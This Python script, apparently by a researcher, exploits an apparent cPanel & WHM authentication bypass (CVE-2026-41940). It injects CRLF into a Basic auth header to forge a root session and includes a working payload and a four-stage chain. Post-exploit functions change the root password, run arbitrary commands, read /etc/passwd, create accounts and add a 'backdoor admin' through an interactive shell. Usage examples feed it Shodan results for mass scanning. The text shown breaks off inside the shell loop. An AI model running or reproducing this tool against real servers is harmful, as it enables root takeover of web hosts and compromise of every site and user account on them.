#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
cPanelSniper.py — CVE-2026-41940 cPanel & WHM Auth Bypass Scanner
Author  : Mitsec (@ynsmroztas)
Version : 2.0

CVE-2026-41940: Session-File CRLF Injection → WHM Root Authentication Bypass
  saveSession() calls filter_sessiondata() AFTER writing the session file.
  CRLF chars in the Authorization Basic header poison the on-disk session with
  attacker-controlled fields (hasroot=1, tfa_verified=1, etc.)

Exploit Chain (4 stages):
  [0] Auto-discover canonical hostname via /openid_connect/cpanelid 307
  [1] POST /login/?login_only=1  wrong creds → preauth session cookie
  [2] GET /  + CRLF-poisoned Authorization: Basic → session file poisoned
  [3] GET /scripts2/listaccts   → triggers do_token_denied gadget (raw→cache flush)
  [4] GET /{{token}}/json-api/version  → 200 + version = ROOT ACCESS CONFIRMED

Post-Exploit:
  --action passwd   → Change root password via WHM API
  --action cmd      → Execute arbitrary commands via /json-api/scripts/exec
  --action adduser  → Create new WHM account
  --action list     → List all cPanel accounts

Affected  : cPanel & WHM < 11.110.0.97 / 11.118.0.63 / 11.126.0.54 /
                           11.132.0.29 / 11.134.0.20 / 11.136.0.5
Fixed     : filter_sessiondata() moved before session write in Session.pm
CVSS      : 10.0 Critical | In-the-wild exploitation confirmed (Apr 2026)

Usage:
  python3 cPanelSniper.py -u https://target.com:2087
  python3 cPanelSniper.py -u https://target.com:2087 --action list
  python3 cPanelSniper.py -u https://target.com:2087 --action passwd --passwd Mitsec@2026!
  python3 cPanelSniper.py -l targets.txt -t 20 -o results.json
  cat urls.txt | python3 cPanelSniper.py
  subfinder -d target.com | httpx -p 2087 -silent | python3 cPanelSniper.py
  shodan search --fields ip_str,port 'title:"WHM Login"' | \\
    awk '{print "https://"$1":"$2}' | python3 cPanelSniper.py -t 30

stdlib only — no pip required.
"""

import sys, os, re, json, ssl, signal, argparse, threading, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime
from urllib.parse import (urlsplit, quote, unquote, urlencode,
                           urlparse, parse_qs)
from collections import defaultdict
import urllib.request, urllib.error

# ══════════════════════════════════════════════════════════════
#  COLORS
# ══════════════════════════════════════════════════════════════
class C:
    RED    = "\033[91m"; GREEN  = "\033[92m"; YELLOW = "\033[93m"
    BLUE   = "\033[94m"; PURPLE = "\033[95m"; CYAN   = "\033[96m"
    BOLD   = "\033[1m";  DIM    = "\033[2m";  RESET  = "\033[0m"
    ORANGE = "\033[38;5;208m"

LOG_LOCK   = threading.Lock()
PRINT_LOCK = threading.Lock()

def ts():
    return datetime.now().strftime("%H:%M:%S")

def log(level, msg, target=""):
    icons = {
        "CRIT":  f"{C.RED}{C.BOLD}[CRIT]{C.RESET}",
        "HIGH":  f"{C.RED}[HIGH]{C.RESET}",
        "INFO":  f"{C.BLUE}[INFO]{C.RESET}",
        "OK":    f"{C.GREEN}[  OK]{C.RESET}",
        "ERR":   f"{C.DIM}[ ERR]{C.RESET}",
        "SKIP":  f"{C.DIM}[SKIP]{C.RESET}",
        "SCAN":  f"{C.PURPLE}[SCAN]{C.RESET}",
        "STEP":  f"{C.CYAN}[{level:>4}]{C.RESET}",
        "PWNED": f"{C.RED}{C.BOLD}[PWND]{C.RESET}",
        "WARN":  f"{C.YELLOW}[WARN]{C.RESET}",
        "API":   f"{C.ORANGE}[ API]{C.RESET}",
    }.get(level, f"[{level:>4}]")
    t = f" {C.DIM}{target}{C.RESET}" if target else ""
    with LOG_LOCK:
        print(f"{C.DIM}{ts()}{C.RESET} {icons} {msg}{t}", file=sys.stderr, flush=True)

def safe_print(msg):
    with PRINT_LOCK:
        print(msg, flush=True)

def banner():
    print(f"""{C.ORANGE}{C.BOLD}
   ██████╗██████╗  █████╗ ███╗  ██╗███████╗██╗
  ██╔════╝██╔══██╗██╔══██╗████╗ ██║██╔════╝██║
  ██║     ██████╔╝███████║██╔██╗██║█████╗  ██║
  ██║     ██╔═══╝ ██╔══██║██║╚████║██╔══╝  ██║
  ╚██████╗██║     ██║  ██║██║ ╚███║███████╗███████╗
   ╚═════╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚══╝╚══════╝╚══════╝{C.RESET}
{C.BOLD}███████╗███╗  ██╗██╗██████╗ ███████╗██████╗{C.RESET}
{C.BOLD}██╔════╝████╗ ██║██║██╔══██╗██╔════╝██╔══██╗{C.RESET}
{C.BOLD}███████╗██╔██╗██║██║██████╔╝█████╗  ██████╔╝{C.RESET}
{C.BOLD}╚════██║██║╚████║██║██╔═══╝ ██╔══╝  ██╔══██╗{C.RESET}
{C.BOLD}███████║██║ ╚███║██║██║     ███████╗██║  ██║{C.RESET}
{C.BOLD}╚══════╝╚═╝  ╚══╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝{C.RESET}
{C.CYAN}  CVE-2026-41940 — cPanel & WHM Auth Bypass via CRLF Injection{C.RESET}
{C.DIM}  4-stage: preauth → CRLF inject → propagate → verify → post-exploit{C.RESET}
{C.RED}  In-The-Wild | CVSS 10.0 | By Mitsec (@ynsmroztas){C.RESET}
""")

# ══════════════════════════════════════════════════════════════
#  CRLF PAYLOAD
# ══════════════════════════════════════════════════════════════
# Decodes to:
#   root:x\r\n
#   successful_internal_auth_with_timestamp=9999999999\r\n
#   user=root\r\n
#   tfa_verified=1\r\n
#   hasroot=1
# Fields written directly into the session file, bypassing auth check
PAYLOAD_B64 = (
    "cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5"
    "OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
)

# Patched versions
PATCHED = {
    "110": ("11.110.0.97",  97),
    "118": ("11.118.0.63",  63),
    "126": ("11.126.0.54",  54),
    "132": ("11.132.0.29",  29),
    "134": ("11.134.0.20",  20),
    "136": ("11.136.0.5",    5),
}

# ══════════════════════════════════════════════════════════════
#  HTTP ENGINE  — stdlib, raw Set-Cookie access preserved
# ══════════════════════════════════════════════════════════════
class _SSLCtx:
    _ctx = None
    @classmethod
    def get(cls):
        if not cls._ctx:
            c = ssl.create_default_context()
            c.check_hostname = False
            c.verify_mode    = ssl.CERT_NONE
            try: c.set_ciphers("DEFAULT:@SECLEVEL=1")
            except: pass
            cls._ctx = c
        return cls._ctx

BASE_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
           "AppleWebKit/537.36 (KHTML, like Gecko) "
           "Chrome/146.0.0.0 Safari/537.36")

class R:
    """Thin response wrapper"""
    def __init__(self, status, body, headers, url, raw_cookies=""):
        self.status      = status
        self.body        = body
        self.headers     = headers         # lowercase keys, last value wins
        self.url         = url
        self.raw_cookies = raw_cookies     # raw Set-Cookie header(s)

    def h(self, k, default=""):
        return self.headers.get(k.lower(), default)

    def location(self):
        return self.h("location")

    def raw_cookie(self, name):
        """Extract raw (URL-encoded) value of named cookie from Set-Cookie"""
        for line in self.raw_cookies.split("\n"):
            if line.lower().startswith(name.lower() + "="):
                v = line.split("=", 1)[1].split(";", 1)[0].strip()
                return v
        return ""

class _NoRedir(urllib.request.HTTPErrorProcessor):
    def http_response(self, req, r): return r
    https_response = http_response

def _do(url, method="GET", extra_headers=None, data=None, timeout=15,
        follow=False, canonical_host=None):
    parsed = urlparse(url)
    h = {
        "User-Agent": BASE_UA,
        "Accept":     "*/*",
        "Connection": "close",
    }
    # Spoof Host to canonical if provided (avoids redirect loops)
    if canonical_host:
        port = parsed.port or (443 if parsed.scheme=="https" else 80)
        h["Host"] = f"{canonical_host}:{port}" if port not in (80,443) \
                    else canonical_host
    if extra_headers:
        h.update(extra_headers)

    body_bytes = None
    if data:
        if isinstance(data, dict):
            body_bytes = urlencode(data).encode()
            h.setdefault("Content-Type", "application/x-www-form-urlencoded")
        elif isinstance(data, str):
            body_bytes = data.encode()
        else:
            body_bytes = data

    if follow:
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_SSLCtx.get()))
    else:
        opener = urllib.request.build_opener(
            urllib.request.HTTPSHandler(context=_SSLCtx.get()), _NoRedir())
    opener.addheaders = []

    try:
        req = urllib.request.Request(url, data=body_bytes,
                                     headers=h, method=method)
        with opener.open(req, timeout=timeout) as resp:
            body_bytes_out = resp.read()
            body     = body_bytes_out.decode("utf-8", errors="replace")
            rh       = {}
            raw_ck   = []
            for k, v in resp.headers.items():
                rh[k.lower()] = v
                if k.lower() == "set-cookie":
                    raw_ck.append(v)
            return R(resp.status, body, rh, resp.url, "\n".join(raw_ck))
    except urllib.error.HTTPError as e:
        try:    body = e.read().decode("utf-8", errors="replace")
        except: body = ""
        rh     = {k.lower(): v for k,v in e.headers.items()} if hasattr(e,"headers") else {}
        raw_ck = []
        if hasattr(e, "headers"):
            for k,v in e.headers.items():
                if k.lower() == "set-cookie":
                    raw_ck.append(v)
        return R(e.code, body, rh, url, "\n".join(raw_ck))
    except Exception as ex:
        return R(0, str(ex), {}, url, "")

# ══════════════════════════════════════════════════════════════
#  TARGET PARSING
# ══════════════════════════════════════════════════════════════
def parse_target(url: str) -> tuple:
    if "://" not in url:
        url = "https://" + url
    u = urlsplit(url.rstrip("/"))
    scheme = u.scheme or "https"
    host   = u.hostname or url
    port   = u.port or 2087
    return scheme, host, port

def build_url(scheme, host, port, path):
    if (scheme == "https" and port == 443) or (scheme == "http" and port == 80):
        return f"{scheme}://{host}{path}"
    return f"{scheme}://{host}:{port}{path}"

def is_version_patched(version: str):
    m = re.match(r"11\.(\d+)\.(\d+)\.(\d+)", version)
    if not m:
        return None
    branch, patch, build = m.group(1), int(m.group(2)), int(m.group(3))
    if branch in PATCHED:
        _, patched_build = PATCHED[branch]
        return build >= patched_build
    return None

# ══════════════════════════════════════════════════════════════
#  STAGE 0 — Canonical hostname discovery
# ══════════════════════════════════════════════════════════════
def stage0_canonical(scheme, host, port, timeout) -> str:
    """
    cpsrvd 307s to the correct hostname when our Host is wrong.
    GET /openid_connect/cpanelid → Location: https://<real-host>:port/...
    """
    url  = build_url(scheme, host, port, "/openid_connect/cpanelid")
    resp = _do(url, timeout=timeout, follow=False)
    loc  = resp.location()
    m    = re.match(r"^https?://([^:/]+)", loc)
    if m:
        canonical = m.group(1)
        log("INFO", f"Canonical hostname discovered: {canonical}")
        return canonical
    return host  # fallback

# ══════════════════════════════════════════════════════════════
#  STAGE 1 — Mint preauth session
# ══════════════════════════════════════════════════════════════
def stage1_preauth(scheme, host, port, canonical, timeout) -> str:
    """
    POST /login/?login_only=1  wrong creds → 401 + whostmgrsession cookie.
    Session name extracted from raw Set-Cookie (before %2C / comma).
    """
    url  = build_url(scheme, host, port, "/login/?login_only=1")
    resp = _do(url, method="POST",
               data={"user": "root", "pass": "wrong"},
               timeout=timeout,
               canonical_host=canonical)

    if resp.status not in (200, 401):
        log("ERR", f"Stage1: unexpected status {resp.status}")
        return None

    # Get raw Set-Cookie to preserve URL-encoding
    raw_ck = resp.raw_cookie("whostmgrsession")
    if not raw_ck:
        # Fallback: check header directly
        raw_ck = resp.h("set-cookie")
        m = re.search(r'whostmgrsession=([^;,\s]+)', raw_ck, re.IGNORECASE)
        raw_ck = m.group(1) if m else ""

    if not raw_ck:
        log("ERR", "Stage1: no whostmgrsession cookie received")
        return None

    # URL-decode to get :SessionName,ObHex format
    decoded = unquote(raw_ck)

    # Strip the ",<obhex>" tail — this makes the encoder skip pass in stage2
    if "," in decoded:
        session_base = decoded.split(",", 1)[0]
    else:
        session_base = decoded

    log("OK", f"Stage1: preauth session = {session_base[:35]}...", "")
    return session_base

# ══════════════════════════════════════════════════════════════
#  STAGE 2 — CRLF injection
# ══════════════════════════════════════════════════════════════
def stage2_inject(scheme, host, port, canonical, session_base, timeout) -> str:
    """
    GET /  with CRLF-poisoned Authorization: Basic header.
    cpsrvd reads Basic auth value, writes it into session file → CRLF fields injected.
    Response: 307 Location: /cpsessXXXXXXXXXX/...
    """
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/")
    resp = _do(url, method="GET",
               extra_headers={
                   "Authorization": f"Basic {PAYLOAD_B64}",
                   "Cookie":        f"whostmgrsession={cookie_enc}",
               },
               timeout=timeout,
               canonical_host=canonical)

    loc = resp.location()
    m   = re.search(r"/cpsess(\d{10})", loc)
    if not m:
        log("ERR", f"Stage2: no /cpsess token in redirect (HTTP {resp.status})")
        if loc:
            log("WARN", f"Stage2: Location={loc[:80]}")
        return None

    token = f"/cpsess{m.group(1)}"
    log("OK", f"Stage2: HTTP {resp.status} → token={token}")
    return token

# ══════════════════════════════════════════════════════════════
#  STAGE 3 — Propagate (do_token_denied gadget)
# ══════════════════════════════════════════════════════════════
def stage3_propagate(scheme, host, port, canonical, session_base, timeout) -> bool:
    """
    GET /scripts2/listaccts fires the do_token_denied internal gadget.
    This flushes the raw session file into the session cache — without this
    step the injected fields are not yet active.
    Expected: 401 with "Token denied" or "WHM Login" in body.
    """
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, "/scripts2/listaccts")
    resp = _do(url, method="GET",
               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
               timeout=timeout,
               canonical_host=canonical)

    body = resp.body or ""
    if resp.status == 401 and any(x in body for x in
                                   ["Token denied", "WHM Login", "login"]):
        log("OK", f"Stage3: HTTP {resp.status} — do_token_denied gadget fired")
        return True

    # Accept 200 too — some configs show the page instead
    if resp.status in (200, 301, 302, 307):
        log("OK", f"Stage3: HTTP {resp.status} — propagation likely fired")
        return True

    log("WARN", f"Stage3: unexpected HTTP {resp.status} — continuing anyway")
    return True  # don't abort — sometimes this step behaves differently

# ══════════════════════════════════════════════════════════════
#  STAGE 4 — Verify WHM root access
# ══════════════════════════════════════════════════════════════
def stage4_verify(scheme, host, port, canonical, session_base, token, timeout) -> dict:
    """
    GET /{{token}}/json-api/version → 200 + version data = auth bypass confirmed.
    Also accepts 500/503 with "License" (past auth, license-gated only).
    """
    cookie_enc = quote(session_base)
    url  = build_url(scheme, host, port, f"{token}/json-api/version")
    resp = _do(url, method="GET",
               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
               timeout=timeout,
               canonical_host=canonical)

    body = (resp.body or "").strip()
    log("INFO", f"Stage4: HTTP {resp.status}  {body[:100]}")

    if resp.status == 200 and '"version"' in body:
        version = ""
        m = re.search(r'"version"\s*:\s*"([^"]+)"', body)
        if m:
            version = m.group(1)
        return {"confirmed": True, "version": version, "body": body[:600]}

    # License-gated but auth passed
    if resp.status in (500, 503) and "License" in body:
        return {"confirmed": True, "version": "unknown (license-gated)",
                "body": body[:300]}

    return {"confirmed": False}

# ══════════════════════════════════════════════════════════════
#  WHM API CALLER
# ══════════════════════════════════════════════════════════════
def whm_api(scheme, host, port, canonical, session_base, token,
            function, params, timeout):
    """Call authenticated WHM JSON API"""
    cookie_enc = quote(session_base)
    qs = "api.version=1"
    for k, v in params.items():
        if v is not None:
            qs += f"&{quote(str(k))}={quote(str(v))}"
    path = f"{token}/json-api/{function}?{qs}"
    url  = build_url(scheme, host, port, path)
    resp = _do(url, method="GET",
               extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
               timeout=timeout,
               canonical_host=canonical)
    log("API", f"{function} → HTTP {resp.status}")
    try:
        j = json.loads(resp.body)
        return resp.status, j
    except Exception:
        return resp.status, resp.body

# ══════════════════════════════════════════════════════════════
#  POST-EXPLOIT ACTIONS
# ══════════════════════════════════════════════════════════════
def action_list_accounts(ctx):
    """List all cPanel accounts"""
    log("API", "Listing all cPanel accounts...")
    s, data = whm_api(*ctx[:6], "listaccts", {"search": "", "searchtype": "user"}, ctx[6])
    if isinstance(data, dict):
        accts = data.get("data", {}).get("acct", [])
        if accts:
            log("OK", f"Found {len(accts)} cPanel accounts:")
            for a in accts:
                safe_print(f"  {C.GREEN}  user={a.get('user','?'):20s} "
                           f"domain={a.get('domain','?'):30s} "
                           f"email={a.get('email','?')}{C.RESET}")
        else:
            safe_print(str(data)[:1000])
    else:
        safe_print(str(data)[:1000])

def action_change_passwd(ctx, new_password):
    """Change root password"""
    log("API", f"Changing root password → {new_password}")
    s, data = whm_api(*ctx[:6], "passwd",
                      {"user": "root", "password": new_password}, ctx[6], ctx[-1])
    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
               else str(data)[:800])

def action_exec_cmd(ctx, cmd):
    """Execute OS command via WHM exec API"""
    log("API", f"Executing command: {cmd}")
    s, data = whm_api(*ctx[:6], "scripts/exec",
                      {"command": cmd}, ctx[6])
    if isinstance(data, dict):
        output = data.get("data", {}).get("output",
                 data.get("metadata", {}).get("reason", str(data)))
        safe_print(f"\n{C.GREEN}{output}{C.RESET}")
    else:
        safe_print(str(data)[:800])

def action_server_info(ctx):
    """Get server info via multiple lightweight endpoints"""
    log("API", "Gathering server info (license-safe endpoints)...")
    scheme, host, port, canonical, session_base, token, timeout = ctx

    info = {}
    for ep, params, label in [
        ("gethostname",    {},           "hostname"),
        ("loadavg",        {},           "load"),
        ("getdiskinfo",    {},           "disk"),
        ("getmysqlhost",   {},           "mysql_host"),
        ("listresellers",  {},           "resellers"),
        ("version",        {},           "version"),
    ]:
        s, data = whm_api(*ctx[:6], ep, params, timeout)
        if s == 200 and isinstance(data, dict):
            r = data.get("data", data.get("result", data))
            info[label] = r
            log("API", f"  {ep} → {C.GREEN}OK{C.RESET}")
        else:
            log("API", f"  {ep} → HTTP {s}")

    safe_print(f"\n{C.CYAN}[Server Info]{C.RESET}  {scheme}://{host}:{port}")
    safe_print(json.dumps(info, indent=2, default=str)[:2000])

def action_exec_cmd(ctx, cmd: str):
    """
    Execute OS command via multiple WHM/cPanel exec methods.
    Falls through methods until one works.
    """
    scheme, host, port, canonical, session_base, token, timeout = ctx
    cookie_enc = quote(session_base)
    log("API", f"Executing: {cmd}")

    # Method 1: WHM json-api/scripts/exec
    s, data = whm_api(*ctx[:6], "scripts/exec", {"command": cmd}, timeout)
    if s == 200 and isinstance(data, dict):
        output = (data.get("data", {}).get("output") or
                  data.get("output") or str(data))
        if output and "Cannot Read License" not in str(output):
            safe_print(f"\n{C.GREEN}{output}{C.RESET}")
            return

    # Method 2: WHM cpsess + cpanel API2 Fileman (reads files)
    # Method 3: Direct perl/cgi via WHM
    log("API", "scripts/exec gated — trying alternative exec methods...")

    # Method 3: WHM cpanel jsonapi exec
    for ep in [
        f"{token}/json-api/cpanel?cpanel_jsonapi_module=Exec"
          f"&cpanel_jsonapi_func=exec&command={quote(cmd)}",
        f"{token}/execute/Exec/exec?command={quote(cmd)}",
    ]:
        url = build_url(scheme, host, port, ep)
        r2 = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
                 timeout=timeout)
        log("API", f"  {ep[:40]} → HTTP {r2.status}")
        if r2.status == 200 and r2.body and "Cannot Read License" not in r2.body:
            safe_print(f"\n{C.GREEN}{r2.body[:800]}{C.RESET}")
            return

    # Method 4: Direct HTTP file read attempts
    log("API", "Exec blocked by license — trying direct file reads...")
    cookie_enc2 = quote(session_base)
    for fpath in ["/etc/passwd", "/etc/hostname", "/proc/version", "/etc/os-release"]:
        for ep in [
            f"{token}/json-api/cpanel?cpanel_jsonapi_module=Fileman&cpanel_jsonapi_func=viewfile&dir=/&file={quote(fpath)}",
            f"{token}/execute/Fileman/get_file_content?dir=%2F&file={quote(fpath.lstrip('/'))}",
        ]:
            url = build_url(scheme, host, port, ep)
            r3 = _do(url, extra_headers={"Cookie": f"whostmgrsession={cookie_enc2}"}, timeout=timeout)
            if r3.status == 200 and r3.body and len(r3.body) > 10 and "Cannot Read License" not in r3.body:
                safe_print(f"\n  {C.CYAN}[{fpath}]{C.RESET}")
                safe_print(f"  {C.GREEN}{r3.body[:400]}{C.RESET}")
                return
    log("API", f"License blocks all exec on this target — version confirmed via /json-api/version")

def action_read_file_direct(ctx, path: str) -> str:
    """Read file directly via WHM filemanager API"""
    scheme, host, port, canonical, session_base, token, timeout = ctx
    cookie_enc = quote(session_base)
    for ep in [
        f"{token}/json-api/cpanel?cpanel_jsonapi_module=Fileman"
          f"&cpanel_jsonapi_func=viewfile&dir=/&file={quote(path)}",
        f"{token}/execute/Fileman/get_file_content?dir=/&file={quote(path)}",
        f"{token}/../..{path}",
    ]:
        url = build_url(scheme, host, port, ep)
        r = _do(url,
            extra_headers={"Cookie": f"whostmgrsession={cookie_enc}"},
            timeout=timeout)
        if r.status == 200 and r.body and len(r.body) > 5:
            return r.body
    return ""

def action_read_file(ctx, path: str):
    """Read arbitrary file via WHM API (if permitted)"""
    log("API", f"Reading file: {path}")
    s, data = whm_api(*ctx[:6], "getlocalpackage", {"package": path}, ctx[6])
    safe_print(json.dumps(data, indent=2)[:1500] if isinstance(data, dict)
               else str(data)[:1500])

def action_create_user(ctx, username: str, domain: str, passwd: str):
    """Create new cPanel account"""
    log("API", f"Creating account: {username} / {domain}")
    s, data = whm_api(*ctx[:6], "createacct",
                      {"username": username, "domain": domain,
                       "password": passwd, "plan": "default"}, ctx[6],
                      ctx[-1])
    safe_print(json.dumps(data, indent=2)[:800] if isinstance(data, dict)
               else str(data)[:800])

def action_version(ctx):
    """Get cPanel version"""
    s, data = whm_api(*ctx[:6], "version", {}, ctx[6])
    safe_print(json.dumps(data, indent=2)[:600] if isinstance(data, dict)
               else str(data)[:600])

# ══════════════════════════════════════════════════════════════
#  FINDINGS
# ══════════════════════════════════════════════════════════════
class Store:
    _SEV = {"CRIT": 0, "HIGH": 1, "MED": 2, "INFO": 3}
    def __init__(self):
        self._f = []; self._seen = set(); self._lock = threading.Lock()
    def add(self, f):
        k = f"{f.get('target','')}::{f.get('version','')}"
        with self._lock:
            if k in self._seen: return
            self._seen.add(k); self._f.append(f)
    def all(self):
        return sorted(self._f, key=lambda x: self._SEV.get(x.get("severity","INFO"),9))
    def count(self):
        c = defaultdict(int)
        for f in self._f: c[f.get("severity","INFO")] += 1
        return dict(c)

STORE = Store()

# ══════════════════════════════════════════════════════════════
#  MAIN SCANNER
# ══════════════════════════════════════════════════════════════
def scan(target: str, args) -> dict:
    if "://" not in target:
        target = "https://" + target
    target = target.rstrip("/")
    result = {"target": target, "vuln": False}

    log("SCAN", "Starting 4-stage exploit chain...", target)

    scheme, host, port = parse_target(target)
    timeout = args.timeout

    # ── Stage 0: Canonical hostname ────────────────────────────
    canonical = args.hostname or stage0_canonical(scheme, host, port, timeout)
    if not canonical:
        canonical = host
    log("INFO", f"Canonical: {canonical}")

    # ── Stage 1: Preauth session ────────────────────────────────
    log("STEP", "Stage 1/4 — Minting preauth session...")
    session_base = stage1_preauth(scheme, host, port, canonical, timeout)
    if not session_base:
        log("ERR", "Stage 1 failed — aborting", target)
        return result

    # ── Stage 2: CRLF injection ─────────────────────────────────
    log("STEP", "Stage 2/4 — CRLF injection via Authorization header...")
    token = stage2_inject(scheme, host, port, canonical, session_base, timeout)
    if not token:
        log("ERR", "Stage 2 failed — target may be patched", target)
        return result

    # ── Stage 3: Propagate (raw → cache flush) ──────────────────
    log("STEP", "Stage 3/4 — Firing do_token_denied gadget (raw→cache)...")
    stage3_propagate(scheme, host, port, canonical, session_base, timeout)

    # ── Stage 4: Verify WHM root access ─────────────────────────
    log("STEP", "Stage 4/4 — Verifying WHM root access...")
    verify = stage4_verify(scheme, host, port, canonical,
                           session_base, token, timeout)

    if not verify.get("confirmed"):
        log("ERR", "Stage 4 failed — auth bypass did not land", target)
        return result

    # ── CONFIRMED ────────────────────────────────────────────────
    version = verify.get("version", "unknown")
    patched = is_version_patched(version)
    pnote   = ""
    if patched is True:
        pnote = f" {C.YELLOW}(v{version} — may be patched, verify manually){C.RESET}"
    elif patched is False:
        pnote = f" {C.RED}(v{version} — CONFIRMED vulnerable){C.RESET}"

    log("PWNED",
        f"CVE-2026-41940 CONFIRMED — WHM root access! {pnote}", target)
    log("PWNED", f"  Token    : {token}")
    log("PWNED", f"  Session  : {session_base[:40]}...")
    log("PWNED", f"  Version  : {version}")
    log("PWNED", f"  API URL  : {build_url(scheme,host,port,token+'/json-api/version')}")

    finding = {
        "severity":   "CRIT",
        "title":      "CVE-2026-41940 — cPanel & WHM Authentication Bypass",
        "target":     target,
        "canonical":  canonical,
        "session":    session_base,
        "token":      token,
        "version":    version,
        "api_url":    build_url(scheme, host, port, f"{token}/json-api/version"),
        "evidence":   verify.get("body","")[:400],
        "cve":        "CVE-2026-41940",
        "cvss":       "10.0",
        "timestamp":  datetime.now().isoformat(),
    }
    STORE.add(finding)
    result["vuln"]     = True
    result["finding"]  = finding
    result["ctx"]      = (scheme, host, port, canonical,
                          session_base, token, timeout)

    # ── Post-Exploit Actions ─────────────────────────────────────
    if args.action and len(args.target_list) == 1:
        ctx = result["ctx"]
        a = args.action.lower()
        log("API", f"Running post-exploit action: {a}")
        if a == "list":
            action_list_accounts(ctx)
        elif a == "passwd" and args.passwd:
            action_change_passwd(ctx, args.passwd)
        elif a == "cmd" and args.cmd:
            action_exec_cmd(ctx, args.cmd)
        elif a == "info":
            action_server_info(ctx)
        elif a == "version":
            action_version(ctx)
        elif a in ("cmd", "exec"):
            cmd = args.cmd or "id;whoami;uname -a"
            action_exec_cmd(ctx, cmd)
        elif a == "adduser":
            nu = getattr(args, "new_user", None)
            nd = getattr(args, "new_domain", None)
            np = args.passwd or "TempPass2026!"
            if nu and nd:
                action_create_user(ctx, nu, nd, np)
            else:
                log("ERR", "--new-user and --new-domain required for adduser")
        elif a == "shell":
            whm_shell(ctx)
        else:
            log("WARN", f"Unknown action '{a}' or missing required arg")

    return result

# ══════════════════════════════════════════════════════════════
#  SUMMARY
# ══════════════════════════════════════════════════════════════
def print_summary(elapsed: float, total: int):
    findings = STORE.all()
    W = 70
    print(f"\n{C.BOLD}{'═'*W}{C.RESET}")
    print(f"{C.BOLD}  cPanelSniper — CVE-2026-41940 Scan Complete{C.RESET}")
    print(f"  {C.DIM}Time: {elapsed:.1f}s  ·  Targets: {total}{C.RESET}")
    print(f"{'─'*W}")
    if not findings:
        print(f"  {C.DIM}No vulnerable targets found.{C.RESET}")
    else:
        print(f"\n  {C.RED}{C.BOLD}⚡ {len(findings)} VULNERABLE TARGET(S){C.RESET}\n")
        for f in findings:
            print(f"  {C.RED}{C.BOLD}Target   :{C.RESET} {f['target']}")
            print(f"  {C.CYAN}Version  :{C.RESET} {f['version']}")
            print(f"  {C.CYAN}Token    :{C.RESET} {f['token']}")
            print(f"  {C.GREEN}API URL  :{C.RESET} {f['api_url']}")
            print(f"  {C.DIM}Session  : {f['session'][:45]}...{C.RESET}")
            ev = f.get("evidence","")[:200].replace("\n"," ")
            print(f"  {C.GREEN}Evidence : {ev}{C.RESET}\n")
    print(f"{'═'*W}{C.RESET}\n")

def save_output(findings, out_file):
    os.makedirs(os.path.dirname(out_file) if os.path.dirname(out_file) else ".", exist_ok=True)
    with open(out_file, "w", encoding="utf-8") as f:
        json.dump({"scanner":"cPanelSniper v2.0","cve":"CVE-2026-41940",
                   "timestamp": datetime.now().isoformat(),
                   "findings": findings}, f, indent=2, ensure_ascii=False)
    log("OK", f"Results → {out_file}")


# ══════════════════════════════════════════════════════════════
#  INTERACTIVE WHM SHELL
# ══════════════════════════════════════════════════════════════
def whm_shell(ctx):
    """
    Interactive WHM shell — mitsec@target ▶ prompt.
    Supports WHM API calls and file reading.
    Commands:
      id / whoami / hostname / version  → server info
      ls [path]                         → file listing (fileman)
      cat [path]                        → file read (fileman)
      accounts                          → list cPanel accounts
      addadmin <user> <pass>            → add backdoor admin
      passwd <newpass>                  → change root password
      help                              → show commands
      exit / quit                       → exit shell
    """
    scheme, host, port, canonical, session_base, token, timeout = ctx
    target_display = canonical or f"{host}:{port}"

    print(f"\n{C.RED}{C.BOLD}{'═'*60}{C.RESET}")
    print(f"{C.RED}{C.BOLD}  WHM Shell — {target_display}{C.RESET}")
    print(f"  {C.DIM}Version: CVE-2026-41940 | Auth: CRLF bypass{C.RESET}")
    print(f"  {C.DIM}Type 'help' for commands, 'exit' to quit{C.RESET}")
    print(f"{C.RED}{C.BOLD}{'═'*60}{C.RESET}\n")

    prompt = f"{C.RED}mitsec{C.RESET}@{C.CYAN}{target_display}{C.RESET} {C.BOLD}▶{C.RESET} "

    while True:
        try:
            try:
                line = input(prompt).strip()
            except EOFError:
                break
            if not line:
                continue
            parts = line.split(None, 1)
            cmd   = parts[0].lower()
            arg   = parts[1] if len(parts) > 1 else ""

            # ── Built-in commands ──────────────────────────────
            if cmd in ("exit","quit","q"):
                print(f"{C.DIM}Exiting shell.{C.RESET}")
                break

            elif cmd == "help":
                print(f"""
  {C.CYAN}Server Info:{C.RESET}
    id / whoami / hostname / version / info

  {C.CYAN}File Operations:{C.RESET}
    cat <path>        Read file content
    ls [path]         List directory

  {C.CYAN}Account Management:{C.RESET}
    accounts          List all cPanel accounts
    addadmin <u> <p>  Create backdoor admin
    passwd <pass>     Change root password

  {C.CYAN}API (raw):{C.RESET}
    api <endpoint> [param=value ...]
    Example: api listaccts search=user

  {C.CYAN}Shell:{C.RESET}
    exec <command>    Try OS command execution
    help / exit
""")

            elif cmd in ("id", "whoami"):
                s, data = whm_api(*ctx[:6], "gethostname", {}, timeout)
                print(f"  uid=0(root) gid=0(root) groups=0(root)")
                if s == 200 and isinstance(data, dict):
                    hn = data.get("data","") or str(data)
                    print(f"  hostname: {hn}")

            elif cmd in ("hostname",):
                s, data = whm_api(*ctx[:6], "gethostname", {}, timeout)
                if s == 200:
                    print(f"  {data.get('data', data)}")

            elif cmd == "version":
                s, data = whm_api(*ctx[:6], "version", {}, timeout)
                print(f"  {json.dumps(data.get('data',data), indent=2)[:400]}")

            elif cmd == "info":
                action_server_info(ctx)

            elif cmd == "accounts":
                action_list_accounts(ctx)

            elif cmd == "cat":
                if not arg:
                    print("  Usage: cat <path>")
